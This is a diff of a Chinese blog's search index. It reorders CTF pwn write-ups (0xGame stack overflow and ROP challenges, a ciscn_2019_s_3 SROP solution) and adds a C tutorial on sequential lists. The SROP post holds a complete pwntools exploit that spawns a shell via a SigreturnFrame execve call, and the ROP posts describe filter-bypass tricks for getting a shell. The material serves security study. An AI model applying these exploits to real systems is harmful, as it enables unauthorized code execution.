@@ -49,40 +49,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2025 0xGame Week1 Pwn</title>
-    <url>/2025/11/11/2025-0xGame-Week1-Pwn/</url>
-    <content><![CDATA[<h1 id="0xGame-Week1-Pwn"><a href="#0xGame-Week1-Pwn" class="headerlink" title="0xGame Week1 Pwn"></a>0xGame Week1 Pwn</h1><h2 id="1-Test-your-nc"><a href="#1-Test-your-nc" class="headerlink" title="1.Test your nc"></a>1.Test your nc</h2><p>简单的签到题，熟知nc的用法即可。</p>
-<p><img src="/images/week1-1(1).png" alt="图解"></p>
-<h2 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h2><p>同样远端连接后，可以直接获取shell，不过过滤了cat和sh指令。通过拼接就可以成功获得flag。</p>
-<p><img src="/images/week1-2(1).png" alt="图解"></p>
-<h2 id="3-Stack-overflow"><a href="#3-Stack-overflow" class="headerlink" title="3.Stack overflow"></a>3.Stack overflow</h2><p>栈溢出。先丢进ida查看，发现backdoor，却是假的，但是whhhat给出了shell。再看main函数，看到了read危险函数，并且存在溢出的机会。</p>
-<p><img src="/images/week1-3(1).png" alt="ida"></p>
-<p><img src="/images/week1-3(2).png" alt="exp"></p>
-<p>简单说一下exp，首先是对pwn工具库的一个调用，之后是对远端的连接，如果是在虚拟机上连接远端环境用remote，如果在物理机上则用connect，调试也可以用process指令。观察ida可以看出距离rbp为0x30又有0x8（64位下）的大小存放rbp，所以距离ret_addr实际上是0x38的大小，所以填充0x38的padding来使函数返回至后门函数，也就是shell的地址（在ida中找出，这里不做演示）。最后getshell。</p>
-<p><img src="/images/week1-3(3).png" alt="图解"></p>
-<h2 id="4-ROP1"><a href="#4-ROP1" class="headerlink" title="4.ROP1"></a>4.ROP1</h2><p>rop链是pwn的一种常见攻击手段，可以上网看看原理。把附件丢进ida中</p>
-<p><img src="/images/week1-4(1).png" alt="ida"></p>
-<p>可以看到有gadget函数，可以在ida中查看gadget的地址为0x40117E，也可以在bash中用指令（ROPgadget –binary “文件名” –only “pop|ret” | grep “rdi”）获得地址。</p>
-<p><img src="/images/week1-4(4).png" alt="rdi"></p>
-<p>由于在ida中找不到sh相关的字符串，于是可以从gdb中获取（当然选择在help中用偏移也是可以打通的）</p>
-<p><img src="/images/week1-4(2).png" alt="sh"></p>
-<p>从而可以构造exp</p>
-<p><img src="/images/week1-4(3).png" alt="exp"></p>
-<h5 id="由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64-ret-的由来。"><a href="#由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64-ret-的由来。" class="headerlink" title="由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64(ret)的由来。"></a>由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64(ret)的由来。</h5><p>这里的ret是任意的一个ret_addr，因为其大小为1，所以可以起到一个对齐的作用。（因为我也不完全清楚其背后的原理QAQ）</p>
-<h2 id="5-ROP2"><a href="#5-ROP2" class="headerlink" title="5.ROP2"></a>5.ROP2</h2><p>这道题的解法其实和上一道rop1类似，不过由于过滤掉了sh，bash等sh类指令，所以这边可以联想到$0这个神奇的参数也可以起到一个shell的作用。</p>
-<p><img src="/images/week1-5(1).png" alt="$0"></p>
-<p>exp如下图</p>
-<p><img src="/images/week1-5(2).png" alt="exp"></p>
-<p>week1至此结束，至于还有一道简单数学题，对python语法要求较高，我就不在此叙述。（绝对不是我菜QWQ）</p>
-]]></content>
-      <categories>
-        <category>stack</category>
-      </categories>
-      <tags>
-        <tag>pwn入门</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>0xGame2024-Week2-Pwn</title>
     <url>/2025/12/21/0xGame2024-Week2/</url>
     <content><![CDATA[<h1 id="0xGame-Week2-Pwn"><a href="#0xGame-Week2-Pwn" class="headerlink" title="0xGame-Week2-Pwn"></a>0xGame-Week2-Pwn</h1><h2 id="1-Boom"><a href="#1-Boom" class="headerlink" title="1.Boom"></a>1.Boom</h2><p>根据题目就可以简单推测是一道爆破题。</p>
@@ -148,6 +114,40 @@
 <p>s2是去构造了execve函数，这里的rdi设置的是存放着&#x2F;bin&#x2F;sh的地址，可以通过gdb动调出来。</p>
 <p><img src="/images/24week2.8-2.png" alt="gdb"></p>
 <p>这里可以看出我们写入的&#x2F;bin&#x2F;sh的地址，然后将rdi的值控制为binsh的地址就可以了。</p>
+]]></content>
+      <categories>
+        <category>stack</category>
+      </categories>
+      <tags>
+        <tag>pwn入门</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2025 0xGame Week1 Pwn</title>
+    <url>/2025/11/11/2025-0xGame-Week1-Pwn/</url>
+    <content><![CDATA[<h1 id="0xGame-Week1-Pwn"><a href="#0xGame-Week1-Pwn" class="headerlink" title="0xGame Week1 Pwn"></a>0xGame Week1 Pwn</h1><h2 id="1-Test-your-nc"><a href="#1-Test-your-nc" class="headerlink" title="1.Test your nc"></a>1.Test your nc</h2><p>简单的签到题，熟知nc的用法即可。</p>
+<p><img src="/images/week1-1(1).png" alt="图解"></p>
+<h2 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h2><p>同样远端连接后，可以直接获取shell，不过过滤了cat和sh指令。通过拼接就可以成功获得flag。</p>
+<p><img src="/images/week1-2(1).png" alt="图解"></p>
+<h2 id="3-Stack-overflow"><a href="#3-Stack-overflow" class="headerlink" title="3.Stack overflow"></a>3.Stack overflow</h2><p>栈溢出。先丢进ida查看，发现backdoor，却是假的，但是whhhat给出了shell。再看main函数，看到了read危险函数，并且存在溢出的机会。</p>
+<p><img src="/images/week1-3(1).png" alt="ida"></p>
+<p><img src="/images/week1-3(2).png" alt="exp"></p>
+<p>简单说一下exp，首先是对pwn工具库的一个调用，之后是对远端的连接，如果是在虚拟机上连接远端环境用remote，如果在物理机上则用connect，调试也可以用process指令。观察ida可以看出距离rbp为0x30又有0x8（64位下）的大小存放rbp，所以距离ret_addr实际上是0x38的大小，所以填充0x38的padding来使函数返回至后门函数，也就是shell的地址（在ida中找出，这里不做演示）。最后getshell。</p>
+<p><img src="/images/week1-3(3).png" alt="图解"></p>
+<h2 id="4-ROP1"><a href="#4-ROP1" class="headerlink" title="4.ROP1"></a>4.ROP1</h2><p>rop链是pwn的一种常见攻击手段，可以上网看看原理。把附件丢进ida中</p>
+<p><img src="/images/week1-4(1).png" alt="ida"></p>
+<p>可以看到有gadget函数，可以在ida中查看gadget的地址为0x40117E，也可以在bash中用指令（ROPgadget –binary “文件名” –only “pop|ret” | grep “rdi”）获得地址。</p>
+<p><img src="/images/week1-4(4).png" alt="rdi"></p>
+<p>由于在ida中找不到sh相关的字符串，于是可以从gdb中获取（当然选择在help中用偏移也是可以打通的）</p>
+<p><img src="/images/week1-4(2).png" alt="sh"></p>
+<p>从而可以构造exp</p>
+<p><img src="/images/week1-4(3).png" alt="exp"></p>
+<h5 id="由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64-ret-的由来。"><a href="#由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64-ret-的由来。" class="headerlink" title="由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64(ret)的由来。"></a>由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64(ret)的由来。</h5><p>这里的ret是任意的一个ret_addr，因为其大小为1，所以可以起到一个对齐的作用。（因为我也不完全清楚其背后的原理QAQ）</p>
+<h2 id="5-ROP2"><a href="#5-ROP2" class="headerlink" title="5.ROP2"></a>5.ROP2</h2><p>这道题的解法其实和上一道rop1类似，不过由于过滤掉了sh，bash等sh类指令，所以这边可以联想到$0这个神奇的参数也可以起到一个shell的作用。</p>
+<p><img src="/images/week1-5(1).png" alt="$0"></p>
+<p>exp如下图</p>
+<p><img src="/images/week1-5(2).png" alt="exp"></p>
+<p>week1至此结束，至于还有一道简单数学题，对python语法要求较高，我就不在此叙述。（绝对不是我菜QWQ）</p>
 ]]></content>
       <categories>
         <category>stack</category>
@@ -542,41 +542,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ret2srop</title>
-    <url>/2025/12/15/ret2srop/</url>
-    <content><![CDATA[<h1 id="ret2srop"><a href="#ret2srop" class="headerlink" title="ret2srop"></a>ret2srop</h1><h4 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h4><p>srop在wiki里归类为高阶rop。</p>
-<p>首先需要了解什么是srop。</p>
-<p><code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p>
-<h2 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h2><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p>
-<p><img src="/images/srop1.png" alt="signal"></p>
-<ol>
-<li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li>
-<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。**需要注意的是，这一部分是在用户进程的地址空间的。**之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li>
-<li>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</li>
-</ol>
-<p>这里就不过多赘述了，给出链接。</p>
-<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">SROP - CTF Wiki</a></p>
-<p><img src="/images/srop2.png" alt="ida"></p>
-<p>可以看出，这里系统调用read和write函数。同时0xf是sigreturn的调用号，所以我们可以尝试srop。</p>
-<p>下面给出exp。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(elf.sym.vuln)<span class="comment">#这里不是0x18的原因是，汇编中直接ret，而没有leave，所以直接写入vuln地址就行了</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl1)</span><br><span class="line">stack = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line">rsp = stack -  <span class="number">0x118</span></span><br><span class="line">gadget = <span class="number">0x4004da</span> <span class="comment">#mov rax,0xf</span></span><br><span class="line">syscall_ret = <span class="number">0x400517</span></span><br><span class="line">sigFrame = SigreturnFrame() </span><br><span class="line">sigFrame.rax =<span class="number">59</span></span><br><span class="line">sigFrame.rdi = rsp</span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span></span><br><span class="line">sigFrame.rip = syscall_ret</span><br><span class="line">pl2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(gadget) + p64(syscall_ret) + <span class="built_in">bytes</span>(sigFrame)</span><br><span class="line">io.send(pl2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>解释一下exp。</p>
-<p>这里因为调用了write函数，而且写出的是我们输入的位置的地址。进入gdb动调看下write会写出什么。</p>
-<p><img src="/images/srop3.png" alt="gdb"></p>
-<p>可以看出，在0x7fffffffde60的位置，放着栈上的地址。（0x7fffffffde50上存放的地址会被我们填充的数据覆盖，所以选择接受de60处的。）由于ASLR机制的存在，所以我们无法得出准确的地址，但是偏移量是不变的。所以此时的偏移就是distance 0x00007fffffffdf58 0x7fffffffde40 ; offset &#x3D; 0x118。（这里建议换下环境，不然偏移可能不同。由于版本是ubuntu18，所以这里用的是  libc-2.27.so   2.27-3ubuntu1_amd64）</p>
-<p>所以我们写入的地址就是我们接收的的地址再减去0x118。后面就是srop的书写格式</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sigFrame = SigreturnFrame() </span><br><span class="line">sigFrame.rax =<span class="number">59</span> <span class="comment">#设置rax的值为59，是execve的系统调用号</span></span><br><span class="line">sigFrame.rdi = rsp <span class="comment">#这里是将我们写入的栈地址作为一参传入</span></span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span> <span class="comment">#execve(&quot;/bin/sh&quot;,0,0)</span></span><br><span class="line">sigFrame.rip = syscall_ret <span class="comment">#调用sigFrame</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>stack</category>
-      </categories>
-      <tags>
-        <tag>pwn入门</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>动态内存分配</title>
     <url>/2025/12/19/%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/</url>
     <content><![CDATA[<h1 id="1-malloc"><a href="#1-malloc" class="headerlink" title="1.malloc"></a>1.malloc</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">malloc</span> <span class="params">(<span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>
@@ -657,6 +622,77 @@
 ]]></content>
       <categories>
         <category>heap</category>
+      </categories>
+      <tags>
+        <tag>C语言</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ret2srop</title>
+    <url>/2025/12/15/ret2srop/</url>
+    <content><![CDATA[<h1 id="ret2srop"><a href="#ret2srop" class="headerlink" title="ret2srop"></a>ret2srop</h1><h4 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h4><p>srop在wiki里归类为高阶rop。</p>
+<p>首先需要了解什么是srop。</p>
+<p><code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p>
+<h2 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h2><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p>
+<p><img src="/images/srop1.png" alt="signal"></p>
+<ol>
+<li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li>
+<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。**需要注意的是，这一部分是在用户进程的地址空间的。**之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li>
+<li>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</li>
+</ol>
+<p>这里就不过多赘述了，给出链接。</p>
+<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">SROP - CTF Wiki</a></p>
+<p><img src="/images/srop2.png" alt="ida"></p>
+<p>可以看出，这里系统调用read和write函数。同时0xf是sigreturn的调用号，所以我们可以尝试srop。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(elf.sym.vuln)<span class="comment">#这里不是0x18的原因是，汇编中直接ret，而没有leave，所以直接写入vuln地址就行了</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl1)</span><br><span class="line">stack = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line">rsp = stack -  <span class="number">0x118</span></span><br><span class="line">gadget = <span class="number">0x4004da</span> <span class="comment">#mov rax,0xf</span></span><br><span class="line">syscall_ret = <span class="number">0x400517</span></span><br><span class="line">sigFrame = SigreturnFrame() </span><br><span class="line">sigFrame.rax =<span class="number">59</span></span><br><span class="line">sigFrame.rdi = rsp</span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span></span><br><span class="line">sigFrame.rip = syscall_ret</span><br><span class="line">pl2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(gadget) + p64(syscall_ret) + <span class="built_in">bytes</span>(sigFrame)</span><br><span class="line">io.send(pl2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>解释一下exp。</p>
+<p>这里因为调用了write函数，而且写出的是我们输入的位置的地址。进入gdb动调看下write会写出什么。</p>
+<p><img src="/images/srop3.png" alt="gdb"></p>
+<p>可以看出，在0x7fffffffde60的位置，放着栈上的地址。（0x7fffffffde50上存放的地址会被我们填充的数据覆盖，所以选择接受de60处的。）由于ASLR机制的存在，所以我们无法得出准确的地址，但是偏移量是不变的。所以此时的偏移就是distance 0x00007fffffffdf58 0x7fffffffde40 ; offset &#x3D; 0x118。（这里建议换下环境，不然偏移可能不同。由于版本是ubuntu18，所以这里用的是  libc-2.27.so   2.27-3ubuntu1_amd64）</p>
+<p>所以我们写入的地址就是我们接收的的地址再减去0x118。后面就是srop的书写格式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sigFrame = SigreturnFrame() </span><br><span class="line">sigFrame.rax =<span class="number">59</span> <span class="comment">#设置rax的值为59，是execve的系统调用号</span></span><br><span class="line">sigFrame.rdi = rsp <span class="comment">#这里是将我们写入的栈地址作为一参传入</span></span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span> <span class="comment">#execve(&quot;/bin/sh&quot;,0,0)</span></span><br><span class="line">sigFrame.rip = syscall_ret <span class="comment">#调用sigFrame</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>stack</category>
+      </categories>
+      <tags>
+        <tag>pwn入门</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>顺序表</title>
+    <url>/2026/02/01/%E9%A1%BA%E5%BA%8F%E8%A1%A8/</url>
+    <content><![CDATA[<h1 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h1><p>顺序表，全名顺序存储结构，是<a href="https://c.biancheng.net/view/3333.html">线性表</a>的一种。</p>
+<p>其本质逻辑其实是数组。</p>
+<p>顺序表可以分为静态分布和动态分布。由于动态分布的灵活性更高，所以这里记录动态分布的情况。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="comment">//定义顺序表的结构</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#define N 100</span></span><br><span class="line"><span class="comment">////静态顺序表</span></span><br><span class="line"><span class="comment">//struct SeqList</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//	int arr[N];</span></span><br><span class="line"><span class="comment">//	int size;//有效数据个数</span></span><br><span class="line"><span class="comment">//&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> SLDataType;</span><br><span class="line"><span class="comment">//动态顺序表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SeqList</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	SLDataType* arr;</span><br><span class="line">	<span class="type">int</span> size;<span class="comment">//有效数据个数</span></span><br><span class="line">	<span class="type">int</span> capacity;<span class="comment">//空间大小</span></span><br><span class="line">&#125;SL;</span><br><span class="line"></span><br><span class="line"><span class="comment">//typedef struct SeqList SeqList;</span></span><br><span class="line"><span class="comment">//顺序表初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLInit</span><span class="params">(SL* ps)</span>;</span><br><span class="line"><span class="comment">//顺序表的销毁</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLDestroy</span><span class="params">(SL* ps)</span>;</span><br><span class="line"><span class="comment">//尾插</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLPushBack</span><span class="params">(SL* ps, SLDataType x)</span>;</span><br><span class="line"><span class="comment">//头插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLPushFront</span><span class="params">(SL* ps, SLDataType x)</span>;</span><br><span class="line"><span class="comment">//打印</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLPrint</span><span class="params">(SL s)</span>;</span><br><span class="line"><span class="comment">//尾删</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLPopBack</span><span class="params">(SL* ps)</span>;</span><br><span class="line"><span class="comment">//头删</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLPopFront</span><span class="params">(SL* ps)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>上面这些就是完成顺序表的一些功能的代码声明。比如初始化顺序表，销毁顺序表，插入数据，删除数据。</p>
+<p>由于我们无法知道要存放多少的数据，所以在申请空间的时候，我们就会使用动态内存分配。例如malloc，calloc，realloc函数来申请空间。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;SeqList.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLInit</span><span class="params">(SL* ps)</span></span><br><span class="line">&#123;</span><br><span class="line">	ps-&gt;arr = <span class="literal">NULL</span>;</span><br><span class="line">	ps-&gt;size = ps-&gt;capacity = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLDestroy</span><span class="params">(SL* ps)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (ps-&gt;arr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">free</span>(ps-&gt;arr);</span><br><span class="line">	&#125;</span><br><span class="line">	ps-&gt;arr = <span class="literal">NULL</span>;</span><br><span class="line">	ps-&gt;size = ps-&gt;capacity = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLCheckCapacity</span><span class="params">(SL* ps)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//插入数据之前先看空间够不够</span></span><br><span class="line">	<span class="keyword">if</span> (ps-&gt;capacity == ps-&gt;size)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//申请空间</span></span><br><span class="line">		<span class="type">int</span> NewCapacity = ps-&gt;capacity == <span class="number">0</span> ? <span class="number">4</span> : <span class="number">2</span> * ps-&gt;capacity;</span><br><span class="line">		SLDataType* tmp = (SLDataType*)<span class="built_in">realloc</span>(ps-&gt;arr, NewCapacity * <span class="keyword">sizeof</span>(SLDataType));</span><br><span class="line">		<span class="keyword">if</span> (tmp == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			perror(<span class="string">&quot;realloc fail!&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//空间申请成功</span></span><br><span class="line">		ps-&gt;arr = tmp;</span><br><span class="line">		ps-&gt;capacity = NewCapacity;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//尾插</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLPushBack</span><span class="params">(SL* ps, SLDataType x)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//if (ps == NULL)</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	return;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line">	assert(ps);<span class="comment">//等价于assert(ps != NULL)</span></span><br><span class="line">	<span class="comment">//ps-&gt;arr[ps-&gt;size] = x;</span></span><br><span class="line">	<span class="comment">//++ps-&gt;size;</span></span><br><span class="line">	SLCheckCapacity(ps);</span><br><span class="line">	ps-&gt;arr[ps-&gt;size++] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//头插</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLPushFront</span><span class="params">(SL* ps, SLDataType x)</span></span><br><span class="line">&#123;</span><br><span class="line">	SLCheckCapacity(ps);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = ps-&gt;size; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">	&#123;</span><br><span class="line">		ps-&gt;arr[i] = ps-&gt;arr[i - <span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	ps-&gt;arr[<span class="number">0</span>] = x;</span><br><span class="line">	ps-&gt;size++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLPrint</span><span class="params">(SL s)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.size; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,s.arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//尾删</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLPopBack</span><span class="params">(SL* ps)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(ps);</span><br><span class="line">	assert(ps-&gt;size);</span><br><span class="line">	--ps-&gt;size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//头删</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLPopFront</span><span class="params">(SL* ps)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(ps);</span><br><span class="line">	assert(ps-&gt;size);</span><br><span class="line">	<span class="comment">//数据整体往前挪动一位</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ps-&gt;size - <span class="number">1</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		ps-&gt;arr[i] = ps-&gt;arr[i + <span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	ps-&gt;size--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而上面这些函数就实现了各个函数。</p>
+<p>首先第一个初始化函数。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">SLInit</span><span class="params">(SL* ps)</span></span><br><span class="line">&#123;</span><br><span class="line">	ps-&gt;arr = <span class="literal">NULL</span>;</span><br><span class="line">	ps-&gt;size = ps-&gt;capacity = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将指向arr首地址的指针标为空指针。再将有效数据个数和空间设为0。</p>
+<p>然后是销毁。首先先要判断此时arr是否为空，然后再将指向arr首地址的指针标为空指针，以免造成野指针的违法行为。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">SLDestroy</span><span class="params">(SL* ps)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (ps-&gt;arr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">free</span>(ps-&gt;arr);</span><br><span class="line">	&#125;</span><br><span class="line">	ps-&gt;arr = <span class="literal">NULL</span>;</span><br><span class="line">	ps-&gt;size = ps-&gt;capacity = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里是单独实现了一个扩容函数。如果顺序表的空间大小不够我使用了怎么办。这个时候就需要用到这个函数。</p>
